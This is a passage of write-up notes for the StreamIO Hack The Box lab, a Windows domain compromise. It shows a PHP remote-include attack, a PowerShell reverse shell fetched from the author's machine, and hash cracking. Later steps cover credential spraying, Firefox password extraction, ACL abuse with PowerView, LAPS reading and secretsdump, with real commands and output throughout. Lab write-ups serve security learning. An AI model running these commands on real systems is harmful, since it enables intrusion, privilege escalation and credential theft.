echo "onlyPD9waHAKZGVmaW5lKCdpbmNsdWRlZCcsdHJ1ZSk7CnNlc3Npb25fc3RhcnQoKTsKaWYoIWlzc2V0KCRfU0VTU0lPTlsnYWRtaW4nXSkpCnsKCWhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwoJZGllKCI8aDE+Rk9SQklEREVOPC9oMT4iKTsKfQokY29ubmVjdGlvbiA9IGFycmF5KCJEYXRhYmFzZSI9PiJTVFJFQU1JTyIsICJVSUQiID0+ICJkYl9hZG1pbiIsICJQV0QiID0+ICdCMUBoeDMxMjM0NTY3ODkwJyk7CiRoYW5kbGUgPSBzcWxzcnZfY29ubmVjdCgnKGxvY2FsKScsJGNvbm5lY3Rpb24pOwoKPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KCTx0aXRsZT5BZG1pbiBwYW5lbDwvdGl0bGU+Cgk8bGluayByZWwgPSAiaWNvbiIgaHJlZj0iL2ltYWdlcy9pY29uLnBuZyIgdHlwZSA9ICJpbWFnZS94LWljb24iPgoJPCEtLSBCYXNpYyAtLT4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgoJPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIiAvPgoJPCEtLSBNb2JpbGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iIC8+Cgk8IS0tIFNpdGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iIiAvPgoJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiIgLz4KCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgoKPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4xLjMvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgaW50ZWdyaXR5PSJzaGEzODQtMUJtRTRrV0JxNzhpWWhGbGR2S3VoZlRBVTZhdVU4dFQ5NFdySGZ0akRickNFWFNVMW9Cb3F5bDJRdlo2aklXMyIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+CjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjEuMy9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1rYTdTazBHbG40Z210ejJNbFFuaWtUMXdYZ1lzT2crT01odVArSWxSSDlzRU5CTzBMUm41cSs4bmJUb3Y0KzFwIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KCgk8IS0tIEN1c3RvbSBzdHlsZXMgZm9yIHRoaXMgdGVtcGxhdGUgLS0+Cgk8bGluayBocmVmPSIvY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoJPCEtLSByZXNwb25zaXZlIHN0eWxlIC0tPgoJPGxpbmsgaHJlZj0iL2Nzcy9yZXNwb25zaXZlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoKPC9oZWFkPgo8Ym9keT4KCTxjZW50ZXIgY2xhc3M9ImNvbnRhaW5lciI+CgkJPGJyPgoJCTxoMT5BZG1pbiBwYW5lbDwvaDE+CgkJPGJyPjxocj48YnI+CgkJPHVsIGNsYXNzPSJuYXYgbmF2LXBpbGxzIG5hdi1maWxsIj4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij91c2VyPSI+VXNlciBtYW5hZ2VtZW50PC9hPgoJCQk8L2xpPgoJCQk8bGkgY2xhc3M9Im5hdi1pdGVtIj4KCQkJCTxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iP3N0YWZmPSI+U3RhZmYgbWFuYWdlbWVudDwvYT4KCQkJPC9saT4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij9tb3ZpZT0iPk1vdmllIG1hbmFnZW1lbnQ8L2E+CgkJCTwvbGk+CgkJCTxsaSBjbGFzcz0ibmF2LWl0ZW0iPgoJCQkJPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSI/bWVzc2FnZT0iPkxlYXZlIGEgbWVzc2FnZSBmb3IgYWRtaW48L2E+CgkJCTwvbGk+CgkJPC91bD4KCQk8YnI+PGhyPjxicj4KCQk8ZGl2IGlkPSJpbmMiPgoJCQk8P3BocAoJCQkJaWYoaXNzZXQoJF9HRVRbJ2RlYnVnJ10pKQoJCQkJewoJCQkJCWVjaG8gJ3RoaXMgb3B0aW9uIGlzIGZvciBkZXZlbG9wZXJzIG9ubHknOwoJCQkJCWlmKCRfR0VUWydkZWJ1ZyddID09PSAiaW5kZXgucGhwIikgewoJCQkJCQlkaWUoJyAtLS0tIEVSUk9SIC0tLS0nKTsKCQkJCQl9IGVsc2UgewoJCQkJCQlpbmNsdWRlICRfR0VUWydkZWJ1ZyddOwoJCQkJCX0KCQkJCX0KCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3VzZXInXSkpCgkJCQkJcmVxdWlyZSAndXNlcl9pbmMucGhwJzsKCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3N0YWZmJ10pKQoJCQkJCXJlcXVpcmUgJ3N0YWZmX2luYy5waHAnOwoJCQkJZWxzZSBpZihpc3NldCgkX0dFVFsnbW92aWUnXSkpCgkJCQkJcmVxdWlyZSAnbW92aWVfaW5jLnBocCc7CgkJCQllbHNlIAoJCQk/PgoJCTwvZGl2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==" | base64 -d > index.php
[Output: base64: invalid input]
cat index.php

---OUTPUT---
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
```
- For master.php
```bash
vi master.b64 # copy here
base64 -d master.b64 > master.php
cat master.php

---OUTPUT---
�yr<h1>Movie managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['movie']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST" action="?movie=">
                                <input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```
- At the bottom we see if the POSt variable include is set it will pass a file get contents and then eval it. Also it checks that it's not index.php
- filegetcontents generally works against url unless configured not to
- If permissions aren't set well it would read php code.
- We test the include parameter in BurpSuite
- We capture a packet of ?debug=master (we still need to add in request)
- We change request to POSt
- instead of debug= we add that on top, we put include below and try to reach out machine with netcat listening
```bash
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=jbhccjhri0h4ric2lgnk459cho
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Length: 35
Content-Type: application/x-www-form-urlencoded

include=http://10.10.14.25/rock.php
```
- we turn our netcat listener on on port 80
- We get a response and the response gets hung cause the eval can't get test.php and tries to process the error.
- We create a php file
```bash
mkdir www
cd www
echo "echo PWN;" > rock.php
echo "system("whoami");" > rock.php
---OUTPUT-WHOAMI---
streamio\yoshihide
```
- We add reverse shell:
- ConPty :https://github.com/antonioCoco/ConPtyShell/tree/master
- We download the ps1 code into a file in our machine.
- we edit our rock.php file to :
```bash
system("powershell IEX(IWR http://10.10.14.25/con.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.25 9999");
```
- We listen via the command provided in github :
```bash
stty raw -echo; (stty size; cat) | nc -lvnp 9999
```
- we get shell as `umstreamio\yoshihide`
- not much privileges :
```bash
net user
net user yoshihide

---OUTPUT---
User name                    yoshihide 
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 2:57:24 AM
Password expires             Never
Password changeable          2/23/2022 2:57:24 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/17/2025 1:24:05 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.
```
- We have mssql creds:
```bash
sqlcmd -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; select username,password from users'

---OUTPUT---
username                                           password
----------------------------- --------------------------------------------------  
nikk37                                     389d14cb8e4e9b94b137deb1caf0612a
yoshihide                                  b779ba15cedfd22a023c4d8bcf5f2332
James                                      c660060492d9edcaa8332d89c99c9239
Theodore                                   925e5408ecb67aea449373d668b7359e
Samantha                                   083ffae904143c4796e464dac33c1f7d
Lauren                                     08344b85b329d7efd611b7a7743e8a09
William                                    d62be0dc82071bccc1322d64ec5b6c51
Sabrina                                    f87d3c0d6c8fd686aacc6627f1f493a5

```
- we clean it to `user:hash` format and try to crack with hashcat
```bash
vi hashes2 # copy in format
hashcat -m 0 --user hashes2 /usr/share/wordlists/rockyou.txt
hashcat -m 0 --user hashes2 --show

---OUTPUT---
nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```
- From enumerating the system earlier we can try nikk37's pwd with winrm and we login
- Otherwise we can copy these passwords onto the previous password list we had and then filter it into a password file like before:
```bash
vi userpass # add contents to it
cat userpass | awk -F: '{print $1":"$3}' > initialfoothold
cat userpass | awk -F: '{print $1}' > users.txt
cat userpass | awk -F: '{print $3}' > pwd.txt
crackmapexec smb 10.10.11.158 -u users.txt -p pwd.txt --no-bruteforce
---OUTPUT---
SMB         10.10.11.158    445    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com
```
- We get a hit so we test with crackmapexec winrm:
```bash
crackmapexec winrm 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'

---OUTPUT---
SMB         10.10.11.158    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
HTTP        10.10.11.158    5985   DC               [*] http://10.10.11.158:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.158    5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
```
- We can winrm to the machine 
- Can get user flag.
## Lateral Movement
- I grabbed bloodhound files both via `bloodhound-python` command and SharpHound.exe
- `bloodhoun-python`:
```bash
bloodhound-python --dns-tcp -ns 10.10.11.158 -d streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com' -c All
```
- SharpHound.exe 
```bash
git clone https://github.com/SpecterOps/BloodHound-Legacy.git
cp SharpHound.exe /home/kali/Downloads/Windows/StreamIO/www
# Also copied nc.exe here
cd /home/kali/Downloads/Windows/StreamIO/www
python3 -m http.server 80
# On another shell
nc -lvnp 9999 > 20250417132515_BloodHound.zip

# After grabbing file
unzip 20250417132515_BloodHound.zip
---ON-TARGET---
curl "http://10.10.14.25/SharpHound.exe" -o SharpHound.exe
./SharpHound.exe
curl "http://10.10.14.25/nc.exe" -o nc.exe
cmd /c "nc.exe 10.10.14.25 9999 < 20250417132515_BloodHound.zip"
```
- we transfer winpeas to target and execute it. (https://github.com/peass-ng/PEASS-ng/releases/tag/20250401-a1b119bc)
```bash
---MAIN-OUTPUT---
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history                                                                                           
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db                                                                              
È Run SharpWeb (https://github.com/djhohnstein/SharpWeb)
```
- We check SharpWeb and send to target (https://github.com/djhohnstein/SharpWeb/releases/tag/v1.2)
- But the exe file reveals nothing when executed
- We grab the key4.db file ( we take the whole directory)
```bash
cd C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\
download br53rxeg.default-release

---OR--
Compress-Archive -Path name -DestinationPath 2.zip
download 2.zip
```
- **NEW TOOL**
- We use firepwd: 
- Been having some python errors with some packages so I create virtual environment
```bash
python3 -m venv firevenv
source firevenv/bin/activate
pip install pycryptodome
pip install pyasn1
cp cp /home/kali/Downloads/Windows/StreamIO/br53rxeg.default-release/logins.json .
cp /home/kali/Downloads/Windows/StreamIO/br53rxeg.default-release/logins-backup.json .
cp /home/kali/Downloads/Windows/StreamIO/br53rxeg.default-release/keys4.db .

python firepwd.pycp 

---OUTPUT---
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```
- We clean it and save to a text file in the format `username:password`\
- We test the creds with crackmapexec. winrm didn't work, also for admin we see another password related to JDgodd so we try it with JDgodd's credential but winrm doesn't work. But e crackmapexec enumeration we do find a hit with SMB :
```bash
crackmapexec smb 10.10.11.158 -u JDgodd -p lateralpassword
--OR--
crackmapexec smb 10.10.11.158 -u lateraluser -p lateralpassword --continue-on-success
---OUTPUT---
MB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
```
- But it is not pwned.
- We check about JDgodd user on BloodHound
- He has Write Privileges on Core staff which can read the pwd of admin
- Last time we tried the owneredit/dacledit method so this time I am trying the Windows method. We login to nikk37's account via evil-winrm
- Actually I tried it and dacledit didn't work. Also both the guides and Ippsec walkthrough uses this route so maybe that's why
```bash
upload www/Powerview.ps1
Import-Module .\PowerView.ps1
--OR--
IEX(iwr http://10.10.14.25/PowerView.ps1 -UseBasicParsing)
---
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
Set-DomainObjectOwner -Credential $Cred -Identity "Core Staff" -OwnerIdentity JDgodd
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -Rights All -PrincipalIdentity JDgodd
Add-DomainGroupMember -Identity 'Core Staff' -Members 'JDgodd(or nikk37)' -Credential $Cred

# To check
net group 'Core Staff'

---OUTPUT---
Members

-------------------------------------------------------------------------------
JDgodd                nikk37
The command completed successfully.
```
- Now we have added JDgodd as member ( we can also add nikk37 instead ) we can attempt to read admin password with pyLAPS (https://github.com/p0dalirius/pyLAPS.git):
```bash
python3 pyLAPS.py --action get -d "streamio.htb" -u "JDgodd" -p "JDg0dd1s@d0p3cr3@t0r"

---OUTPUT---
python3 pyLAPS.py --action get -d "streamio.htb" -u "JDgodd" -p "JDg0dd1s@d0p3cr3@t0r"
                 __    ___    ____  _____
    ____  __  __/ /   /   |  / __ \/ ___/
   / __ \/ / / / /   / /| | / /_/ /\__ \   
  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   
 / .___/\__, /_____/_/  |_/_/    /____/    v1.2
/_/    /____/           @podalirius_           
    
[+] Extracting LAPS passwords of all computers ... 
  | DC$                  : ;8@1AIY4Pw[(f%
[+] All done!
```
- If we added nikk37 instead (since we can access his acc via winrm):
```bash
Get-DomainObject DC -Credential $Cred -Properties "ms-mcs-AdmPwd",name

---OUTPUT---
name ms-mcs-admpwd
---- -------------
DC   ;8@1AIY4Pw[(f%
DC

```
- We can winrm into the machine with these credentials and grab root flag.
```bash
evil-winrm -u administrator -p ';8@1AIY4Pw[(f%' -i  10.10.11.158

---OUTPUT---
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
streamio\administrator

```
- Root flag in Martin's desktop

---------------
## Extra
- When i didnt find root flag in admin's desktop I thought maybe I needed to pivot to another user and was trying secretsdump to exploot DCSync..
- It wasn't required but this was the output:
```bash
impacket-secretsdump 'streamio.htb'/'Administrator':';8@1AIY4Pw[(f%'@'streamio.htb'

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x4dbf07084a530cfa7ab417236bd4a647
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6a559f691b75bff16a07ecbd12e3bdfb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
streamIO\DC$:aes256-cts-hmac-sha1-96:1412e4f50c0a1447fdadc2b56cf561a814e679a12f3f5f46f4f1b8f2611e449a
streamIO\DC$:aes128-cts-hmac-sha1-96:06e6142ab73eec3014ff3b0990d5fd8e
streamIO\DC$:des-cbc-md5:45a229ce7cf20101
streamIO\DC$:plain_password_hex:27c7374ba27e3a6b93199e38921b046544b3b0bc3a1e447819271872eced5cb8342e8614f84ba082b10725c5da70b4c777a6df57c71e07be3ba3d22582766a217c57b5d3edf2c0dd2a70c4fee1dcedca479af4fe6994ebea6644132737747bd0a910394298c71f27d918f4d2574e074400c12fba84ccf35dafeb907e1cae1b2a0e45c8286c2ac65d74eed495f93e33ec2977c0da97ceda21940928b0cbac7501fa385d0b9c20898c9a459b7575b0f228dd78f369c10b9b399dc3dbcd9c7fcd5ee3c3d974928d81695b545a321abc033ddf08b65421c328eab4512ab891666a4f3c2acb90ce4da23c6f0921264cc4a7ae
streamIO\DC$:aad3b435b51404eeaad3b435b51404ee:19a29f516ecdf0d0f54803a8f1e9e815:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xd8b78bca07d4bce21bce1ae04bf231978c84407f
dpapi_userkey:0x9b682d0f5f9b63c03827113581bc2dc4f993e3ee
[*] NL$KM 
 0000   A5 68 6C 6F 0F D6 72 8F  9E DE A2 27 47 D1 73 3A   .hlo..r....'G.s:
 0010   EA FB 23 4A 58 C9 04 91  95 A2 E7 3C 63 1A E8 B1   ..#JX......<c...
 0020   DA D8 C8 95 DD 09 23 97  A5 5A 21 74 17 17 CC C6   ......#..Z!t....
 0030   5E 1B F7 BE 34 99 DC 39  D1 72 7B 3E 19 B6 B2 3C   ^...4..9.r{>...<
NL$KM:a5686c6f0fd6728f9edea22747d1733aeafb234a58c9049195a2e73c631ae8b1dad8c895dd092397a55a21741717ccc65e1bf7be3499dc39d1727b3e19b6b23c
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] Cannot create "sessionresume_LeqHicyG" resume session file: [Errno 13] Permission denied: 'sessionresume_LeqHicyG'
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```
- Earlier before we ffound JDgodd, in bloodhound we did see a path from nikk37 to martin but the path wasn't sure as we can CanPSRemote to our DC but that doesn't imply we gain admin privileges

-------
--------